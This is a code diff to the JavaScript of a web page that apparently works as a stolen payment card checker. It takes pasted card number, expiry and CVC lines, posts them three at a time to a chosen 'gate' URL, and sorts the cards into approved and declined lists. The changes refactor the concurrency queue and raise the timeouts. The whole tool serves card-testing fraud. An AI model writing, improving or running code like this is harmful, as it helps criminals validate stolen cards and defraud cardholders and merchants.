@@ -349,7 +349,7 @@
         $(document).ready(function() {
             let isProcessing = false;
             let activeRequests = 0;
-            const MAX_CONCURRENT = 3; // 3 concurrent POST requests
+            const MAX_CONCURRENT = 3;
             let abortControllers = [];
             let totalCards = 0;
 
@@ -359,6 +359,7 @@
                 const validCards = lines.filter(line => /^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/.test(line.trim()));
                 $('#card-count').text(`${validCards.length} valid cards detected (max 1000)`);
                 
+                // Reset counters automatically when new cards are pasted
                 if ($(this).val().trim()) {
                     $('.carregadas').text('0');
                     $('.approved').text('0');
@@ -418,18 +419,20 @@
                 });
             });
 
-            // Process a single card
-            async function processCard(card, controller) {
+            // Process single card
+            async function processCard(cardData, index, controller) {
                 return new Promise((resolve) => {
-                    const formData = new FormData();
-                    let normalizedYear = card.exp_year;
+                    // Normalize year to 4 digits
+                    let normalizedYear = cardData.exp_year;
                     if (normalizedYear.length === 2) {
                         normalizedYear = (parseInt(normalizedYear) < 50 ? '20' : '19') + normalizedYear;
                     }
-                    formData.append('card[number]', card.number);
-                    formData.append('card[exp_month]', card.exp_month);
+
+                    const formData = new FormData();
+                    formData.append('card[number]', cardData.number);
+                    formData.append('card[exp_month]', cardData.exp_month);
                     formData.append('card[exp_year]', normalizedYear);
-                    formData.append('card[cvc]', card.cvc);
+                    formData.append('card[cvc]', cardData.cvc);
 
                     $.ajax({
                         url: $('#gate').val(),
@@ -437,25 +440,26 @@
                         data: formData,
                         processData: false,
                         contentType: false,
-                        timeout: 12000, // Slightly longer than backend timeout
+                        timeout: 30000,
                         signal: controller.signal,
                         success: function(response) {
-                            resolve({
-                                success: response.includes('APPROVED'),
-                                response: response.trim(),
-                                card: card,
-                                displayCard: `${card.number}|${card.exp_month}|${card.exp_year}|${card.cvc}`
+                            resolve({ 
+                                success: true, 
+                                response, 
+                                card: cardData,
+                                displayCard: `${cardData.number}|${cardData.exp_month}|${cardData.exp_year}|${cardData.cvc}`
                             });
                         },
                         error: function(xhr) {
                             if (xhr.statusText === 'abort') {
                                 resolve(null);
                             } else {
-                                resolve({
-                                    success: false,
-                                    response: `DECLINED [${xhr.responseText || 'Request failed'}] ${card.number}|${card.exp_month}|${card.exp_year}|${card.cvc}`,
-                                    card: card,
-                                    displayCard: `${card.number}|${card.exp_month}|${card.exp_year}|${card.cvc}`
+                                const errorMsg = xhr.responseText || 'Request failed';
+                                resolve({ 
+                                    success: false, 
+                                    response: `DECLINED [${errorMsg}] ${cardData.number}|${cardData.exp_month}|${cardData.exp_year}|${cardData.cvc}`,
+                                    card: cardData,
+                                    displayCard: `${cardData.number}|${cardData.exp_month}|${cardData.exp_year}|${cardData.cvc}`
                                 });
                             }
                         }
@@ -463,7 +467,7 @@
                 });
             }
 
-            // Main processing function with 3 concurrent requests
+            // Main processing function with concurrency control
             async function processCards() {
                 if (isProcessing) return;
 
@@ -501,40 +505,40 @@
 
                 const results = [];
                 let completed = 0;
-                const cardQueue = [...validCards];
 
-                while (cardQueue.length > 0 && isProcessing) {
-                    while (activeRequests < MAX_CONCURRENT && cardQueue.length > 0 && isProcessing) {
-                        const card = cardQueue.shift();
-                        activeRequests++;
-                        const controller = new AbortController();
-                        abortControllers.push(controller);
-
-                        processCard(card, controller).then(result => {
-                            if (result === null) return;
-
-                            results.push(result);
-                            completed++;
-                            activeRequests--;
-
-                            if (result.response.includes('APPROVED')) {
-                                $('#lista_approved').append(`<span style="color: green; font-family: 'Inter', sans-serif;">${result.response}</span><br>`);
-                                $('.approved').text(parseInt($('.approved').text()) + 1);
-                            } else {
-                                $('#lista_declined').append(`<span style="color: red; font-family: 'Inter', sans-serif;">${result.response}</span><br>`);
-                                $('.reprovadas').text(parseInt($('.reprovadas').text()) + 1);
-                            }
-
-                            $('.checked').text(`${completed} / ${totalCards}`);
-
-                            if (completed >= totalCards || !isProcessing) {
-                                finishProcessing();
-                            }
-                        });
+                for (let i = 0; i < validCards.length && isProcessing; i++) {
+                    while (activeRequests >= MAX_CONCURRENT && isProcessing) {
+                        await new Promise(resolve => setTimeout(resolve, 100));
                     }
-                    if (isProcessing) {
-                        await new Promise(resolve => setTimeout(resolve, 10)); // Minimal delay
-                    }
+
+                    if (!isProcessing) break;
+
+                    activeRequests++;
+                    const controller = new AbortController();
+                    abortControllers.push(controller);
+
+                    processCard(validCards[i], i, controller).then(result => {
+                        if (result === null) return;
+
+                        results.push(result);
+                        completed++;
+                        activeRequests--;
+
+                        // Update UI with colored text
+                        if (result.response.includes('APPROVED')) {
+                            $('#lista_approved').append(`<span style="color: green; font-family: 'Inter', sans-serif;">${result.response}</span><br>`);
+                            $('.approved').text(parseInt($('.approved').text()) + 1);
+                        } else {
+                            $('#lista_declined').append(`<span style="color: red; font-family: 'Inter', sans-serif;">${result.response}</span><br>`);
+                            $('.reprovadas').text(parseInt($('.reprovadas').text()) + 1);
+                        }
+
+                        $('.checked').text(`${completed} / ${totalCards}`);
+
+                        if (completed === validCards.length || !isProcessing) {
+                            finishProcessing();
+                        }
+                    });
                 }
             }
 
